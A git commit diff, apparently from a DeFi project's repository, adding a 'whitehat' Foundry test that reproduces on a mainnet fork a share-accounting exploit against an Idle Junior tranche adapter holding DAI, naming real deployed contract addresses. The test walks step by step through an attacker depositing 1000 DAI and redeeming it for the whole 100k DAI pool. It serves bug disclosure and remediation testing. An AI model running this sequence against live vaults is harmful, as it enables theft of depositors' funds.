508acf7c95ade0aa100672512c067d7bb30f8c1a
RedVeil <leon.niesler@gmail.com>
2023-09-26 17:58:41 +0200

    added whitehat test

--- test/vault/adapter/idle/junior/IdleJuniorAdapter.t.sol
+++ test/vault/adapter/idle/junior/IdleJuniorAdapter.t.sol
@@ -123,78 +123,147 @@ contract IdleJuniorAdapterTest is AbstractAdapterTest {
     }
 
     function test__immunify() public {
-        uint256 forkId = vm.createSelectFork(vm.rpcUrl("mainnet"), 18211623);
-        vm.selectFork(forkId);
-
         address daiWhale = 0x075e72a5eDf65F0A5f44699c7654C1a76941Ddc8;
+        address attacker = address(31);
+
         IdleJuniorAdapter daiIdleJuniorAdapter = IdleJuniorAdapter(
             0x197F58De2559097d956b4192e8F89A2F36190a48
         );
         IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
         IERC20 tranche = IERC20(0x38D36353D07CfB92650822D9c31fB4AdA1c73D6E);
+        address trancheWhale = 0x028AbC03CE5f8ed61174512F8635929CC5bb7116;
+
+        // attacker has 1000 DAI
+        vm.prank(daiWhale);
+        dai.transfer(attacker, 1000 * 1e18);
 
         vm.startPrank(daiWhale);
         dai.approve(address(daiIdleJuniorAdapter), type(uint256).max);
-        daiIdleJuniorAdapter.deposit(1000e18, daiWhale);
+        daiIdleJuniorAdapter.deposit(100_000 * 1e18, daiWhale); // 100k DAI deposited
         vm.stopPrank();
 
-        logValues(daiIdleJuniorAdapter, tranche, dai, "old-");
+        emit log_named_uint(
+            "Total supply of the adapter initially",
+            daiIdleJuniorAdapter.totalSupply()
+        );
+        emit log_named_uint(
+            "Total assets of adapter initially",
+            daiIdleJuniorAdapter.totalAssets()
+        );
+        emit log_named_uint(
+            "Idle DAI in the adapter initially",
+            dai.balanceOf(address(daiIdleJuniorAdapter))
+        ); // should be 0
 
         vm.roll(block.number + 1);
 
+        // attacker redeems 1 share, start of the attack here
         vm.prank(daiWhale);
         daiIdleJuniorAdapter.redeem(1, daiWhale, daiWhale);
 
-        logValues(daiIdleJuniorAdapter, tranche, dai, "new-");
+        emit log_named_uint(
+            "Total supply of the adapter after redeeming 1 share",
+            daiIdleJuniorAdapter.totalSupply()
+        );
+        emit log_named_uint(
+            "Total assets of adapter after redeeming 1 share",
+            daiIdleJuniorAdapter.totalAssets()
+        ); // should be 1
+        emit log_named_uint(
+            "Idle DAI in the adapter after redeeming 1 share",
+            dai.balanceOf(address(daiIdleJuniorAdapter))
+        ); // should be all assets
 
-        vm.prank(daiWhale);
-        daiIdleJuniorAdapter.deposit(1000e18, daiWhale);
+        // Now, attacker deposits 1000 * 1e18 DAI
+        vm.startPrank(attacker);
+        dai.approve(address(daiIdleJuniorAdapter), type(uint256).max);
+        daiIdleJuniorAdapter.deposit(1000e18, attacker);
+        vm.stopPrank();
 
         vm.roll(block.number + 1);
 
-        uint256 oldAttackerShares = IERC20(address(daiIdleJuniorAdapter))
-            .balanceOf(daiWhale);
-        uint256 oldAttackerdai = dai.balanceOf(daiWhale);
-
-        emit log_named_uint("oldAttackerShares", oldAttackerShares);
-        emit log_named_uint("oldAttackerdai", oldAttackerdai);
-
-        vm.prank(daiWhale);
-        daiIdleJuniorAdapter.redeem(oldAttackerShares, daiWhale, daiWhale);
-
-        uint256 newAttackerShares = IERC20(address(daiIdleJuniorAdapter))
-            .balanceOf(daiWhale);
-        uint256 newAttackerdai = dai.balanceOf(daiWhale);
-
-        emit log_named_uint("newAttackerShares", newAttackerShares);
-        emit log_named_uint("newAttackerdai", newAttackerdai);
-
-        logValues(daiIdleJuniorAdapter, tranche, dai, "latest-");
-
-        // Unfreeze the remaining assets
-        address owner = 0x22f5413C075Ccd56D575A54763831C4c27A37Bdb;
-        IVaultController vaultController = IVaultController(
-            0x7D51BABA56C2CA79e15eEc9ECc4E92d9c0a7dbeb
+        emit log_named_uint(
+            "Total supply of the adapter after attackers deposit",
+            daiIdleJuniorAdapter.totalSupply()
         );
-        address vault = 0x6cE9c05E159F8C4910490D8e8F7a63e95E6CEcAF;
-        address[] memory vaults = new address[](1);
-        vaults[0] = vault;
+        emit log_named_uint(
+            "Total assets of adapter after attackers deposit",
+            daiIdleJuniorAdapter.totalAssets()
+        );
+        emit log_named_uint(
+            "Idle DAI in the adapter after attackers deposit",
+            dai.balanceOf(address(daiIdleJuniorAdapter))
+        ); // should be only attackers deposit
 
-        // We would need to get atleast 1 tranche share and send it to the adapter (If we dont do this pausing will fail since the tranche doesnt allow us to withdraw 0)
-        deal(address(tranche), address(daiIdleJuniorAdapter), 1);
+        // at this stage attacker has many more shares though it deposited the same amount of DAI
+        emit log_named_uint(
+            "Attackers shares",
+            daiIdleJuniorAdapter.balanceOf(attacker)
+        );
+        emit log_named_uint(
+            "Whales shares",
+            daiIdleJuniorAdapter.balanceOf(daiWhale)
+        ); // remember, whale depsoited 1M.
 
-        // Pause the adapter so `totalAssets` reads the asset balance instead of the tranche balance
-        vm.prank(owner);
-        vaultController.pauseAdapters(vaults);
+        address _owner = daiIdleJuniorAdapter.owner();
 
-        logValues(daiIdleJuniorAdapter, tranche, dai, "paused-");
+        // let owner airdrop 10 DAI to strategy as Popcorn team states
+        vm.prank(trancheWhale);
+        tranche.transfer(_owner, 10 * 1e18);
+        vm.startPrank(_owner);
+        tranche.transfer(address(daiIdleJuniorAdapter), 10 * 1e18);
 
-        // Unpause the adapter to move all funds back into the strategy and resume business as usual
-        vm.prank(owner);
-        vaultController.unpauseAdapters(vaults);
+        // pause-unpause, as Popcorn team states
+        daiIdleJuniorAdapter.pause();
+        daiIdleJuniorAdapter.unpause();
 
-        logValues(daiIdleJuniorAdapter, tranche, dai, "unpaused-");
-        assertGt(daiIdleJuniorAdapter.totalAssets(), 0);
+        emit log_named_uint(
+            "Total supply of the adapter after pause-unpause",
+            daiIdleJuniorAdapter.totalSupply()
+        );
+        emit log_named_uint(
+            "Total assets of adapter after pause-unpause",
+            daiIdleJuniorAdapter.totalAssets()
+        ); // should be all assets
+        emit log_named_uint(
+            "Idle DAI in the adapter after pause-unpause",
+            dai.balanceOf(address(daiIdleJuniorAdapter))
+        ); // should be 0
+
+        vm.stopPrank();
+
+        // attacker withdraws, wil withdraw all DAI stealing 100k DAI
+        vm.startPrank(attacker);
+        emit log_named_uint(
+            "Attackers shares",
+            daiIdleJuniorAdapter.balanceOf(attacker)
+        );
+        daiIdleJuniorAdapter.approve(
+            address(daiIdleJuniorAdapter),
+            type(uint256).max
+        );
+        vm.roll(block.number + 1);
+        uint whatsRedeemed = daiIdleJuniorAdapter.redeem(
+            daiIdleJuniorAdapter.balanceOf(attacker),
+            attacker,
+            attacker
+        );
+
+        emit log_named_uint(
+            "Total supply of the adapter after attack finish",
+            daiIdleJuniorAdapter.totalSupply()
+        );
+        emit log_named_uint(
+            "Total assets of adapter after attack finish",
+            daiIdleJuniorAdapter.totalAssets()
+        ); // should be 0
+        emit log_named_uint(
+            "Idle DAI in the adapter after attack finish",
+            dai.balanceOf(address(daiIdleJuniorAdapter))
+        ); // should be all assets
+        emit log_named_uint("Whats redeemed by the attacker", whatsRedeemed); // should be all assets
+
+        // attacker deposited 1000 DAI and stole 100k DAI.
     }
 
     /*//////////////////////////////////////////////////////////////
